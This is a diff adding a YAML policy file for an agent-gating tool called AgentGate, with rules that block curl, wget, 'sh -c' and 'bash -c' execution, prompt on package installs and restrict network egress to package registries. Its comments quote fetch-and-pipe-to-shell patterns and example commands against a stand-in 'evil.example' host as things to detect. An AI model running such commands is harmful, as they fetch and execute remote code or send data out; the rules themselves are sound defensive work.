@@ -1,0 +1,124 @@
+# AgentGate supply-chain policy cookbook — ready-to-use recipes for real
+# supply-chain attack behavior. Ordered, first-match-wins (like every AgentGate
+# policy). Copy the whole file to ./policy.yaml, or paste the rules you want into
+# your existing policy, then validate with `agentgate check`:
+#
+#   agentgate check --action exec       -- curl http://evil.example
+#   agentgate check --action exec       -- npm install left-pad
+#   agentgate check --action net_egress telemetry.evil.example:443
+#
+# GLOB CORRECTNESS (read this before adding rules of your own):
+#   target_glob has NO `|` alternation — filepath.Match treats `|` as a LITERAL
+#   character. A rule like "*curl*|*sh*" only matches a command containing that
+#   exact literal pipe sequence, and silently misses a bare `curl http://evil`
+#   or `wget ... | sh`. Always list each pattern as its OWN rule (as below);
+#   never use `|` to mean "or".
+#
+# Enforcement surfaces in this version: `exec` and `net_egress` are enforced at
+# runtime; `fs_write` is CHECK/DRY-RUN-ONLY (resolvable via `agentgate check`,
+# not yet intercepted on a live run — runtime write interposition is roadmapped).
+
+default: ask                 # anything no rule matches surfaces a prompt
+
+rules:
+  # === exec: fetch-and-run one-liners (RCE / exfil) ======================
+  # Post-install scripts commonly do `curl http://evil | sh` or `wget ... | sh`
+  # to pull and execute a remote payload. Deny the fetchers outright — each is
+  # its OWN rule (a single "*curl*|*sh*" rule would match neither, see header).
+  - match:
+      action: exec
+      target_glob: "*curl*"
+    decision: deny
+  - match:
+      action: exec
+      target_glob: "*wget*"
+    decision: deny
+
+  # A payload that pipes a downloaded script into a shell, if the fetch itself
+  # slipped through (e.g. an allow rule above it). Deny direct `sh -c` / `bash -c`.
+  - match:
+      action: exec
+      target_glob: "*sh -c*"
+    decision: deny
+  - match:
+      action: exec
+      target_glob: "*bash -c*"
+    decision: deny
+
+  # A post-install script granting itself execute or dropping an executable.
+  - match:
+      action: exec
+      target_glob: "*chmod +x*"
+    decision: deny
+
+  # === exec: dependency installs (typosquat / poisoned package) ==========
+  # Surface every install so you see exactly what package gets pulled. Keep
+  # these as `ask` (not `allow`) — the whole point is a human glance per install.
+  - match:
+      action: exec
+      target_glob: "*npm install*"
+    decision: ask
+  - match:
+      action: exec
+      target_glob: "*pnpm add*"
+    decision: ask
+  - match:
+      action: exec
+      target_glob: "*yarn add*"
+    decision: ask
+  - match:
+      action: exec
+      target_glob: "*pip install*"
+    decision: ask
+  - match:
+      action: exec
+      target_glob: "*uv pip install*"
+    decision: ask
+  - match:
+      action: exec
+      target_glob: "*gem install*"
+    decision: ask
+  - match:
+      action: exec
+      target_glob: "*cargo install*"
+    decision: ask
+
+  # === net_egress: allowlist registries, deny the rest (exfil / C2) ======
+  # A poisoned dependency's payload phones home or exfiltrates data to an
+  # undeclared host. Allow ONLY the registries a normal install needs, then deny
+  # everything else so an unexpected host is blocked and audited.
+  - match:
+      action: net_egress
+      target_glob: "registry.npmjs.org"
+    decision: allow
+  - match:
+      action: net_egress
+      target_glob: "registry.yarnpkg.com"
+    decision: allow
+  - match:
+      action: net_egress
+      target_glob: "pypi.org"
+    decision: allow
+  - match:
+      action: net_egress
+      target_glob: "files.pythonhosted.org"
+    decision: allow
+  - match:
+      action: net_egress
+      target_glob: "crates.io"
+    decision: allow
+  - match:
+      action: net_egress
+      target_glob: "static.crates.io"
+    decision: allow
+  - match:
+      action: net_egress
+      target_glob: "proxy.golang.org"
+    decision: allow
+  - match:
+      action: net_egress
+      target_glob: ".github.com"     # leading-dot = the whole github.com subdomain tree
+    decision: allow
+  - match:
+      action: net_egress
+    decision: deny                    # any undeclared host -> blocked + audited
